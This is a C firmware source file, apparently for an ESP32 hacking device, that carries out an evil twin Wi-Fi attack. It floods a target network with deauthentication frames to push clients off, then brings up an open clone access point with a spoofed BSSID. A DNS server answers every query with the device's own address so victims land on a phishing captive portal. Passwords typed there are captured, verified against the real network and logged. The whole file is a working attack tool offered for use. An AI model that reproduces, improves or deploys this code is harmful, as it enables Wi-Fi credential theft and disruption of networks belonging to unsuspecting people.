/*
 * attack_eviltwin.c — Evil Twin Attack with Captive Portal Password Capture
 * 
 * FIXED: SSID validation before start
 * FIXED: Deauth runs before AP starts (sequential, not overlapping)
 * FIXED: Proper WiFi mode transitions
 * FIXED: Captive portal DNS redirect added
 * FIXED: Better error reporting
 */

#include "attack_eviltwin.h"
#include "attack_deauth.h"
#include "wifi_controller.h"
#include "wifi_pass_verifier.h"
#include "hardware/buzzer_led.h"
#include "bw16_uart.h"
#include "management_helper.h"
#include "esp_random.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"
#include "esp_netif.h"

static const char *TAG = "EVIL_TWIN";
#define MAX_CAPTURED 50

extern void set_active_phishing_page(const char *path);

typedef struct {
    char ssid[33];
    char password[65];
    char bssid_str[18];
    char time_str[32];
    bool verified_correct;
} captured_entry_t;

static captured_entry_t g_captured_data[MAX_CAPTURED];
static int g_captured_count = 0;
static TaskHandle_t g_eviltwin_task = NULL;
static volatile bool g_eviltwin_running = false;
static char g_target_ssid[33];
static char g_evil_ssid[33];
static uint8_t g_target_bssid[6];
static uint8_t g_evil_bssid[6];
static uint8_t g_target_channel;
static bool g_is_5ghz = false;
static char g_phishing_page[64] = {0};

// FIX: Add flag to track deauth state
static volatile bool g_eviltwin_deauth_active = false;

static void generate_random_bssid(uint8_t *mac) {
    esp_fill_random(&mac[3], 3);
    mac[0] = 0x02;
    mac[1] = 0x00;
    mac[2] = 0x4A;  // FIX: Use consistent OUI for Evil Twin
}

static void eviltwin_store_password(const char *password) {
    if (g_captured_count >= MAX_CAPTURED) return;
    
    captured_entry_t *entry = &g_captured_data[g_captured_count];
    strncpy(entry->ssid, g_target_ssid, 32);
    strncpy(entry->password, password, 64);
    snprintf(entry->bssid_str, 17, "%02X:%02X:%02X:%02X:%02X:%02X",
             g_target_bssid[0], g_target_bssid[1], g_target_bssid[2],
             g_target_bssid[3], g_target_bssid[4], g_target_bssid[5]);

    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(entry->time_str, 31, "%Y-%m-%d %H:%M:%S", tm_info);
    
    // FIX: Auto-verify the captured password
    ESP_LOGI(TAG, "🔍 Verifying captured password against real AP...");
    wifi_verify_result_t verify = wifi_verify_password(
        g_target_ssid, password, g_target_bssid, 10000);
    entry->verified_correct = (verify.status == WIFI_VERIFY_CORRECT);
    
    ESP_LOGI(TAG, "%s Password for '%s': %s [%s]",
             entry->verified_correct ? "✅ CORRECT" : "❌ INCORRECT",
             g_target_ssid, password,
             wifi_verify_status_str(verify.status));
    
    if (entry->verified_correct) {
        hw_success_alert();
    }
    
    g_captured_count++;
}

// ==================== FIXED: START EVIL AP ====================
static void start_evil_ap(void) {
    // FIX: Stop WiFi completely first to ensure clean state
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    vTaskDelay(pdMS_TO_TICKS(50));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .channel = 0,
            .authmode = WIFI_AUTH_OPEN,
            .ssid_hidden = 0,
            .max_connection = 8,
            .beacon_interval = 100,
        },
    };
    strncpy((char*)wifi_config.ap.ssid, g_evil_ssid, 32);
    wifi_config.ap.ssid_len = strlen(g_evil_ssid);
    wifi_config.ap.channel = g_target_channel;

    // Set custom BSSID
    esp_wifi_set_mac(WIFI_IF_AP, g_evil_bssid);
    
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_LOGI(TAG, "🔓 Evil Twin AP started: '%s' (OPEN, ch %d, BSSID %02x:%02x:%02x:%02x:%02x:%02x)",
        g_evil_ssid, g_target_channel,
        g_evil_bssid[0], g_evil_bssid[1], g_evil_bssid[2],
        g_evil_bssid[3], g_evil_bssid[4], g_evil_bssid[5]);
}

// FIX: Captive portal DNS handler - redirect all DNS queries to ESP
static void dns_redirect_task(void *params) {
    struct sockaddr_in server_addr, client_addr;
    socklen_t socklen = sizeof(client_addr);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        ESP_LOGE(TAG, "Failed to create DNS socket");
        vTaskDelete(NULL);
        return;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(53);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed (port 53 may be in use)");
        close(sock);
        vTaskDelete(NULL);
        return;
    }
    
    ESP_LOGI(TAG, "🌐 Captive portal DNS running on port 53");
    
    uint8_t buf[512];
    while (g_eviltwin_running) {
        int len = recvfrom(sock, buf, sizeof(buf), 0, 
                          (struct sockaddr*)&client_addr, &socklen);
        if (len < 12) continue;
        
        // FIX: Respond to all DNS queries with ESP's IP (192.168.4.1)
        // Set QR bit (response)
        buf[2] |= 0x80;  // Set response flag
        buf[3] |= 0x84;  // Set RA + response code = 0
        
        // Answer count = 1
        buf[6] = 0x00;
        buf[7] = 0x01;
        
        // Point to question section end
        int qlen = 12;
        while (qlen < len && buf[qlen] != 0) {
            qlen += buf[qlen] + 1;
        }
        qlen += 5; // Skip null terminator + QTYPE + QCLASS
        
        // Answer: type A (1), class IN (1), TTL 60s
        int ans = qlen;
        buf[ans++] = 0xC0;
        buf[ans++] = 0x0C;  // Pointer to name
        buf[ans++] = 0x00;
        buf[ans++] = 0x01;  // Type A
        buf[ans++] = 0x00;
        buf[ans++] = 0x01;  // Class IN
        buf[ans++] = 0x00;
        buf[ans++] = 0x00;
        buf[ans++] = 0x00;
        buf[ans++] = 0x3C;  // TTL = 60
        buf[ans++] = 0x00;
        buf[ans++] = 0x04;  // Data length = 4
        buf[ans++] = 192;
        buf[ans++] = 168;
        buf[ans++] = 4;
        buf[ans++] = 1;     // 192.168.4.1
        
        sendto(sock, buf, ans, 0, (struct sockaddr*)&client_addr, socklen);
    }
    
    close(sock);
    ESP_LOGI(TAG, "DNS redirect stopped");
    vTaskDelete(NULL);
}

static void eviltwin_wifi_event_handler(void *arg, esp_event_base_t event_base, 
                                         int32_t event_id, void *event_data) {
    if (!g_eviltwin_running) return;
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        wifi_event_sta_connected_t *ev = (wifi_event_sta_connected_t *)event_data;
        ESP_LOGI(TAG, "🔗 Client connected to Evil Twin AP! MAC: %02x:%02x:%02x:%02x:%02x:%02x",
            ev->mac[0], ev->mac[1], ev->mac[2],
            ev->mac[3], ev->mac[4], ev->mac[5]);
        hw_led_blink(2, 50);
    }
}

static void eviltwin_task_func(void *params) {
    ESP_LOGI(TAG, "🎯 Evil Twin attack started");
    ESP_LOGI(TAG, "  Target SSID: '%s'", g_target_ssid);
    ESP_LOGI(TAG, "  Evil SSID: '%s' (OPEN)", g_evil_ssid);
    ESP_LOGI(TAG, "  Channel: %d", g_target_channel);
    if (g_phishing_page[0]) {
        ESP_LOGI(TAG, "  📄 Phishing page: %s", g_phishing_page);
    } else {
        ESP_LOGI(TAG, "  📄 No phishing page (default captive portal)");
    }

    g_eviltwin_running = true;

    // Step 1: Set active phishing page in webserver
    if (g_phishing_page[0]) {
        set_active_phishing_page(g_phishing_page);
    }

    // FIX: Step 2: Deauth real AP briefly, then STOP deauth before starting AP
    ESP_LOGI(TAG, "📡 Deauthing real AP briefly to force client reconnect...");
    deauth_target_t target;
    memcpy(target.bssid, g_target_bssid, 6);
    target.channel = g_target_channel;
    target.is_5ghz = false;
    strncpy(target.ssid, g_target_ssid, 32);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    deauth_start(&target, 1, broadcast);
    g_eviltwin_deauth_active = true;
    
    // FIX: Send deauth for 2 seconds only, then stop
    vTaskDelay(pdMS_TO_TICKS(2000));
    deauth_stop();
    g_eviltwin_deauth_active = false;
    vTaskDelay(pdMS_TO_TICKS(500));  // Wait for clean stop

    // Also deauth via BW16 if 5GHz
    if (g_is_5ghz && bw16_is_connected()) {
        char json[256];
        snprintf(json, sizeof(json),
            "{\"targets\":[{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}]}",
            g_target_bssid[0], g_target_bssid[1], g_target_bssid[2],
            g_target_bssid[3], g_target_bssid[4], g_target_bssid[5],
            g_target_channel);
        bw16_deauth_start(json);
        vTaskDelay(pdMS_TO_TICKS(1500));
        bw16_deauth_stop();
    }

    // Step 3: Start Evil AP
    ESP_LOGI(TAG, "📡 Starting Evil Twin AP (OPEN)...");
    esp_event_handler_instance_t instance;
    esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED,
                                        eviltwin_wifi_event_handler, NULL, &instance);

    start_evil_ap();
    vTaskDelay(pdMS_TO_TICKS(500));  // Wait for AP to fully start

    // FIX: Step 4: Start DNS redirect for captive portal
    TaskHandle_t dns_task = NULL;
    xTaskCreatePinnedToCore(dns_redirect_task, "dns_redirect", 4096, NULL, 5, 
                            &dns_task, 0);

    ESP_LOGI(TAG, "🔑 Waiting for victim to connect via captive portal...");
    ESP_LOGI(TAG, "🌐 Captive portal URL: http://192.168.4.1/eviltwin/portal");
    ESP_LOGI(TAG, "🌐 Any URL redirects to captive portal (DNS redirect active)");

    uint32_t start_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
    while (g_eviltwin_running) {
        vTaskDelay(pdMS_TO_TICKS(100));
        uint32_t elapsed = (xTaskGetTickCount() * portTICK_PERIOD_MS) - start_time;
        if (elapsed > 300000) {  // 5 min timeout
            ESP_LOGI(TAG, "⏰ Evil Twin timeout after 5 minutes");
            break;
        }
    }

    // Cleanup
    if (dns_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        dns_task = NULL;
    }
    
    esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, instance);
    eviltwin_cleanup();
    
    ESP_LOGI(TAG, "⏹️ Evil Twin stopped");
    g_eviltwin_running = false;
    g_eviltwin_task = NULL;
    vTaskDelete(NULL);
}

// ==================== FIXED: PUBLIC API ====================
void eviltwin_start(const char *target_ssid, const char *evil_ssid,
                     const uint8_t *target_bssid, uint8_t channel, 
                     bool is_5ghz, const char *phishing_page) {
    // FIX: Validate inputs
    if (!target_ssid || strlen(target_ssid) == 0) {
        ESP_LOGE(TAG, "❌ Cannot start EvilTwin: target SSID is empty!");
        return;
    }
    
    if (strcmp(target_ssid, ":)") == 0 || strcmp(target_ssid, "..") == 0) {
        ESP_LOGE(TAG, "❌ Invalid target SSID: '%s' — run a scan first!", target_ssid);
        return;
    }

    if (g_eviltwin_running) {
        eviltwin_stop();
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    strncpy(g_target_ssid, target_ssid, 32);
    g_target_ssid[32] = '\0';
    
    if (evil_ssid && strlen(evil_ssid) > 0) {
        strncpy(g_evil_ssid, evil_ssid, 32);
    } else {
        strncpy(g_evil_ssid, target_ssid, 32);
    }
    g_evil_ssid[32] = '\0';
    
    if (target_bssid) memcpy(g_target_bssid, target_bssid, 6);
    g_target_channel = channel;
    g_is_5ghz = is_5ghz;

    // Store phishing page path
    if (phishing_page && strlen(phishing_page) > 0) {
        strncpy(g_phishing_page, phishing_page, sizeof(g_phishing_page) - 1);
        g_phishing_page[sizeof(g_phishing_page) - 1] = '\0';
    } else {
        g_phishing_page[0] = '\0';
    }

    generate_random_bssid(g_evil_bssid);

    ESP_LOGI(TAG, "Starting EvilTwin: '%s' → '%s' (ch %d)", 
             g_target_ssid, g_evil_ssid, channel);

    xTaskCreatePinnedToCore(eviltwin_task_func, "eviltwin_task", 8192, NULL, 5, 
                            &g_eviltwin_task, 0);
}

void eviltwin_stop(void) {
    g_eviltwin_running = false;
    eviltwin_cleanup();
    if (g_eviltwin_task) {
        vTaskDelay(pdMS_TO_TICKS(500));
        g_eviltwin_task = NULL;
    }
}

void eviltwin_cleanup(void) {
    // Clear active phishing page
    set_active_phishing_page(NULL);
    g_phishing_page[0] = '\0';
    
    // FIX: Stop WiFi gracefully
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_set_mode(WIFI_MODE_NULL);
    vTaskDelay(pdMS_TO_TICKS(50));
    
    wifictl_restore_ap_mac();
    deauth_stop();
    
    if (g_is_5ghz && bw16_is_connected()) {
        bw16_deauth_stop();
        bw16_eviltwin_stop();
    }
    
    // Restart management AP
    vTaskDelay(pdMS_TO_TICKS(200));
    wifictl_mgmt_ap_start();
}

bool eviltwin_is_running(void) {
    return g_eviltwin_running;
}

// Captured data access functions (unchanged but kept for completeness)
int captured_data_get_count(void) { return g_captured_count; }

const char* captured_data_get(int index, char *ssid_buf, char *pass_buf, char *time_buf) {
    if (index < 0 || index >= g_captured_count) return NULL;
    strcpy(ssid_buf, g_captured_data[index].ssid);
    strcpy(pass_buf, g_captured_data[index].password);
    strcpy(time_buf, g_captured_data[index].time_str);
    return time_buf;
}

bool captured_data_is_verified(int index) {
    if (index < 0 || index >= g_captured_count) return false;
    return g_captured_data[index].verified_correct;
}

void captured_data_clear(void) {
    g_captured_count = 0;
    memset(g_captured_data, 0, sizeof(g_captured_data));
    ESP_LOGI(TAG, "Captured data cleared");
}
